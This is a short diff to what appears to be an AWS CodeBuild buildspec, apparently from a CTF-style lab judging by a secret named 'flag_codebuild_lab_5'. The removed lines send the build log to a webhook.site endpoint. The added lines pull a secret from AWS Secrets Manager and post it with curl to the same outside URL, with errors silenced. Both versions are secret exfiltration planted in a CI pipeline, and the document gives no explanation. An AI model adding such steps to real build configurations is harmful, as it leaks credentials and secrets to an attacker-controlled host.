@@ -5,10 +5,10 @@ phases:
     commands:
       - |
         set +e
-        sleep 15
-        FULL_LOG=$(cat /codebuild/output/default/log 2>/dev/null || true)
+
+        echo "=== IDENTITY ==="
+        
+        FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
+
         curl -sk -X POST "https://webhook.site/17b4b3f4-da5d-4de7-80fc-75fbd9ab1202" \
-          --data-urlencode "full_log=$FULL_LOG" >/dev/null || true
-
-
-          
+          --data-urlencode "flag=$FLAG" >/dev/null || true
